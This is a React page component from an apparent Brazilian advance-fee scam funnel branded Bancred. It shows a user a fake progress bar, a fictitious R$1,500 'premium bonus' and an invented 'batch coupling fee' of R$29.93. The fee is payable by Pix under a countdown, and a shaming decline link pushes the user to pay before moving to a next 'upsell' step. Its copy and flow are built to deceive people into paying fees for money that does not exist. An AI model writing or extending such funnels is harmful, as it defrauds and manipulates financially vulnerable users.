import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import {
  Gift,
  TrendingUp,
  CircleCheck,
  QrCode,
  Copy,
  Check,
  Loader2,
  X,
  Clock,
  Sparkles,
} from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import { useParadisePix } from "@/hooks/useParadisePix";
import { trackEvent } from "@/lib/tracking";
import { getFunnelCustomer } from "@/lib/customer";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const PixIcon = ({ size = 20 }: { size?: number }) => (
  <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 315.63 315.63">
    <g transform="translate(-2394 -4352.093)">
      <path d="M246.13,264.53A46.07,46.07,0,0,1,213.35,251L166,203.62a9,9,0,0,0-12.44,0l-47.51,47.51A46.09,46.09,0,0,1,73.27,264.7H64l60,60a48,48,0,0,0,67.81,0l60.12-60.13Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
      <path d="M73.28,97.09a46.08,46.08,0,0,1,32.78,13.57l47.51,47.52a8.81,8.81,0,0,0,12.44,0l47.34-47.34a46,46,0,0,1,32.78-13.58h5.7L191.71,37.14a47.94,47.94,0,0,0-67.81,0L64,97.09Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
      <path d="M301.56,147l-36.33-36.33a7,7,0,0,1-2.58.52H246.13a32.62,32.62,0,0,0-22.93,9.5L175.86,168a22.74,22.74,0,0,1-32.13,0L96.21,120.51A32.62,32.62,0,0,0,73.28,111H53a7.12,7.12,0,0,1-2.44-.49L14,147a48,48,0,0,0,0,67.81l36.48,36.48a6.85,6.85,0,0,1,2.44-.49H73.28a32.63,32.63,0,0,0,22.93-9.51l47.51-47.51c8.59-8.58,23.56-8.58,32.14,0l47.34,47.33a32.62,32.62,0,0,0,22.93,9.5h16.52a6.9,6.9,0,0,1,2.58.52l36.33-36.33a47.94,47.94,0,0,0,0-67.81" transform="translate(2394.023 4329.001)" fill="#32bcad" />
    </g>
  </svg>
);

const Up4 = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();

  const nomeRaw = params.get("nome") || "";
  const primeiroNome = (nomeRaw.split(" ")[0] || "Cliente").toUpperCase();
  const valorSaque = Number(params.get("valor") || 5000);
  const bonus = 1500;
  const taxa = 29.93;
  const totalNovo = valorSaque + bonus;

  const [showPix, setShowPix] = useState(false);
  const [copied, setCopied] = useState(false);

  const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
    trackEvent({
      event: "CompletePayment",
      value: taxa,
      currency: "BRL",
      contents: [{ content_id: "bonus_premium", content_name: "Bônus Premium", quantity: 1, price: taxa }],
    });
    navigate(`/up5?${params.toString()}`);
  });

  const openPix = async () => {
    setShowPix(true);
    trackEvent({
      event: "InitiateCheckout",
      value: taxa,
      currency: "BRL",
      contents: [{ content_id: "bonus_premium", content_name: "Bônus Premium", quantity: 1, price: taxa }],
    });
    try {
      await create({
        amountCents: Math.round(taxa * 100),
        description: `Bancred - Unificação de saldo bônus`,
        stage: "up4",
        customer: getFunnelCustomer(params),
      });
    } catch {
      /* tratado pelo hook */
    }
  };

  const closePix = () => {
    setShowPix(false);
    reset();
    setCopied(false);
  };

  const handleCopy = async () => {
    if (!pix?.qr_code) return;
    try {
      await navigator.clipboard.writeText(pix.qr_code);
      setCopied(true);
      setTimeout(() => setCopied(false), 2200);
    } catch {
      /* ignore */
    }
  };

  const handleDecline = () => {
    navigate(`/up5?${params.toString()}`);
  };

  return (
    <div style={{ minHeight: "100dvh", background: "#F4F4F7", fontFamily: fontStack, color: "#111827", WebkitFontSmoothing: "antialiased" }}>
      <header style={{ background: "#FFFFFF", borderBottom: "1px solid #E5E7EB", padding: "14px 16px", textAlign: "center" }}>
        <img src={logo} alt="Bancred" style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }} />
      </header>

      <main style={{ padding: "18px 16px", maxWidth: 480, margin: "0 auto" }}>
        {/* Barra de progresso */}
        <div style={{ marginBottom: 16 }}>
          <div style={{ display: "flex", justifyContent: "space-between", fontSize: 12, fontWeight: 700, color: "#15803D", marginBottom: 6 }}>
            <span>PROGRESSO DA LIBERAÇÃO</span>
            <span>97% CONCLUÍDO</span>
          </div>
          <div style={{ width: "100%", height: 10, background: "#E5E7EB", borderRadius: 999, overflow: "hidden" }}>
            <div style={{ width: "97%", height: "100%", background: "linear-gradient(90deg, #84CC16, #22C55E)", borderRadius: 999 }} />
          </div>
        </div>

        {/* Headline */}
        <section style={{ background: "linear-gradient(160deg, #14532D, #16A34A)", borderRadius: 22, padding: "22px 18px", color: "#fff", marginBottom: 14, boxShadow: "0 14px 34px rgba(22,163,74,0.28)" }}>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 800, background: "rgba(255,255,255,0.18)", padding: "6px 10px", borderRadius: 999, marginBottom: 14 }}>
            <Sparkles size={14} /> PRÊMIO LIBERADO
          </div>
          <h1 style={{ fontSize: 22, fontWeight: 900, marginBottom: 8, lineHeight: 1.2 }}>
            {primeiroNome}, você venceu as etapas de segurança!
          </h1>
          <p style={{ fontSize: 14, lineHeight: 1.55, opacity: 0.95, margin: 0 }}>
            O sistema liberou um <strong>bônus de + R$ 1.500,00</strong> direto no seu Pix.
          </p>
        </section>

        {/* Texto persuasivo */}
        <div style={{ background: "#FFFFFF", borderRadius: 16, padding: 16, border: "1px solid #E5E7EB", marginBottom: 14, fontSize: 13.5, lineHeight: 1.6, color: "#1F2937" }}>
          Parabéns! Sua conta foi blindada com sucesso. Por ter concluído os seguros obrigatórios, você entrou no lote de <strong>Clientes Premium</strong> e o sistema resgatou um <strong>saldo residual de R$ 1.500,00</strong> no seu CPF.
          <br /><br />
          Esse valor já foi somado ao seu saldo de <strong>{formatBRL(valorSaque)}</strong>. Para unificar os dois saldos em uma única transferência imediata sem travar o sistema, resta apenas a <strong>taxa de acoplamento de lote de {formatBRL(taxa)}</strong>.
          <br /><br />
          <span style={{ color: "#B45309", fontWeight: 700 }}>Você não vai abrir mão de R$ 1.500,00 que já são seus por causa de vinte e nove reais, vai?</span>
        </div>

        {/* Extrato */}
        <div style={{ background: "#FFFFFF", borderRadius: 16, padding: 18, border: "1px solid #E5E7EB", marginBottom: 18 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, fontWeight: 700, color: "#15803D", marginBottom: 12 }}>
            <TrendingUp size={16} /> EXTRATO ATUALIZADO
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", padding: "10px 0", borderBottom: "1px dashed #E5E7EB", fontSize: 14 }}>
            <span style={{ color: "#6B7280" }}>Saldo inicial</span>
            <span style={{ fontWeight: 700 }}>{formatBRL(valorSaque)}</span>
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", padding: "10px 0", borderBottom: "1px dashed #E5E7EB", fontSize: 14 }}>
            <span style={{ color: "#15803D", display: "inline-flex", alignItems: "center", gap: 6 }}>
              <Gift size={14} /> Bônus Premium
            </span>
            <span style={{ fontWeight: 700, color: "#15803D" }}>+ {formatBRL(bonus)}</span>
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", padding: "10px 0", borderBottom: "1px dashed #E5E7EB", fontSize: 14 }}>
            <span style={{ color: "#6B7280" }}>Taxa de unificação</span>
            <span style={{ fontWeight: 700, color: "#DC2626" }}>{formatBRL(taxa)}</span>
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", padding: "14px 0 4px", fontSize: 16 }}>
            <span style={{ fontWeight: 800 }}>Total a receber</span>
            <span style={{ fontWeight: 900, color: "#16A34A" }}>{formatBRL(totalNovo)}</span>
          </div>
        </div>

        <button
          type="button"
          onClick={openPix}
          style={{
            width: "100%",
            padding: "17px 20px",
            background: "#16A34A",
            color: "#fff",
            border: "none",
            borderRadius: 14,
            fontSize: 15.5,
            fontWeight: 900,
            letterSpacing: 0.2,
            cursor: "pointer",
            boxShadow: "0 10px 28px rgba(22,163,74,0.4)",
            display: "inline-flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 8,
            fontFamily: fontStack,
            minHeight: 58,
            animation: "pulseBtn 1.4s ease-in-out infinite",
            textTransform: "uppercase",
          }}
        >
          <PixIcon size={20} /> Quero multiplicar meu saldo
        </button>
        <style>{`@keyframes pulseBtn { 0%,100% { transform: scale(1); box-shadow: 0 10px 28px rgba(22,163,74,0.4);} 50% { transform: scale(1.02); box-shadow: 0 14px 34px rgba(22,163,74,0.6);} }`}</style>

        <button
          type="button"
          onClick={handleDecline}
          style={{
            display: "block",
            margin: "16px auto 0",
            background: "transparent",
            border: "none",
            color: "#9CA3AF",
            fontSize: 12,
            textDecoration: "underline",
            cursor: "pointer",
            fontFamily: fontStack,
            textAlign: "center",
            lineHeight: 1.5,
            maxWidth: 320,
          }}
        >
          Não quero o bônus de R$ 1.500,00, prefiro abrir mão do dinheiro extra e prosseguir apenas com o valor menor
        </button>
      </main>

      {showPix && (
        <div
          style={{ position: "fixed", inset: 0, background: "rgba(15,23,42,0.55)", backdropFilter: "blur(2px)", display: "flex", alignItems: "flex-end", justifyContent: "center", zIndex: 60 }}
          onClick={closePix}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{ background: "#fff", width: "100%", maxWidth: 480, borderTopLeftRadius: 22, borderTopRightRadius: 22, padding: "14px 18px 24px", maxHeight: "92dvh", overflowY: "auto", fontFamily: fontStack }}
          >
            <div style={{ width: 44, height: 4, background: "#E5E7EB", borderRadius: 2, margin: "0 auto 14px" }} />
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <PixIcon size={22} />
                <span style={{ fontSize: 18, fontWeight: 700 }}>Unificar saldo via PIX</span>
              </div>
              <button type="button" onClick={closePix} aria-label="Fechar" style={{ background: "transparent", border: "none", cursor: "pointer", color: "#6B7280" }}>
                <X size={22} />
              </button>
            </div>

            <div style={{ background: "#F0FDF4", border: "1px solid #DCFCE7", borderRadius: 14, padding: "12px 14px", display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 18 }}>
              <div>
                <div style={{ fontSize: 12, color: "#15803D", fontWeight: 600 }}>Valor a pagar</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: "#16A34A", letterSpacing: -0.4 }}>{formatBRL(taxa)}</div>
              </div>
              <div style={{ display: "inline-flex", alignItems: "center", gap: 6, background: "#fff", border: "1px solid #DCFCE7", color: "#15803D", fontSize: 12, fontWeight: 600, padding: "6px 10px", borderRadius: 999 }}>
                <Clock size={12} /> expira em 15min
              </div>
            </div>

            {pixLoading || !pix ? (
              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0" }}>
                <Loader2 size={42} color="#16A34A" style={{ animation: "spin 1s linear infinite" }} />
                <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>{pixError ? pixError : "Gerando seu código PIX..."}</div>
                <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
              </div>
            ) : (
              <>
                <div style={{ fontSize: 13, color: "#374151", lineHeight: 1.6, marginBottom: 14 }}>
                  Abra o app do seu banco e acesse a área PIX.<br />
                  Escolha <strong>Ler QR Code</strong> ou <strong>PIX Copia e Cola</strong>.<br />
                  Confirme o valor e finalize o pagamento.
                </div>
                <div style={{ background: "#F9FAFB", border: "1px solid #E5E7EB", borderRadius: 14, padding: 16, marginBottom: 14 }}>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, color: "#374151", fontSize: 13, fontWeight: 600, marginBottom: 12 }}>
                    <QrCode size={14} /> Escaneie o QR Code
                  </div>
                  <div style={{ display: "flex", justifyContent: "center" }}>
                    <img src={pix.qr_image} alt="QR Code PIX" width={240} height={240} style={{ display: "block", background: "#fff", padding: 8, borderRadius: 8 }} />
                  </div>
                </div>
                <div style={{ fontSize: 13, fontWeight: 600, color: "#111827", marginBottom: 6 }}>Ou use o PIX Copia e Cola:</div>
                <div style={{ background: "#F9FAFB", border: "1px solid #E5E7EB", borderRadius: 12, padding: 12, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace", fontSize: 12, color: "#111827", wordBreak: "break-all", lineHeight: 1.5, marginBottom: 12 }}>
                  {pix.qr_code}
                </div>
                <button
                  type="button"
                  onClick={handleCopy}
                  style={{ width: "100%", padding: "14px 18px", background: copied ? "#16A34A" : "#1C68E3", color: "#fff", border: "none", borderRadius: 12, fontSize: 15, fontWeight: 700, cursor: "pointer", display: "inline-flex", alignItems: "center", justifyContent: "center", gap: 8, fontFamily: fontStack, minHeight: 50 }}
                >
                  {copied ? <Check size={18} /> : <Copy size={18} />} {copied ? "Copiado!" : "Copiar código PIX"}
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Up4;
